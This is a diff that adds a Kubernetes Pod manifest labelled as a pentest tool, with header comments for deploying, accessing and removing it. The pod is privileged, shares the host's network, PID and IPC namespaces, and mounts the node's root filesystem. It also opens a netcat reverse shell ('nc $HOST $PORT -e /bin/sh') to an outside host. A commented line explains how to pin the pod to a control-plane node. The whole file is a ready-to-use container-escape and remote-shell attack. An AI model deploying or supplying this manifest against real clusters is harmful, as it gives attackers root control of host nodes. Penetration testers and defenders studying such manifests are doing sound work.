@@ -1,0 +1,30 @@
+###########################################################
+## Deploy: kubectl apply -f everything-allowed-exec-pod.yaml 
+## Access: kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
+## Remove: kubectl delete everything-allowed-exec-pod
+###########################################################
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-revshell-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: busybox
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
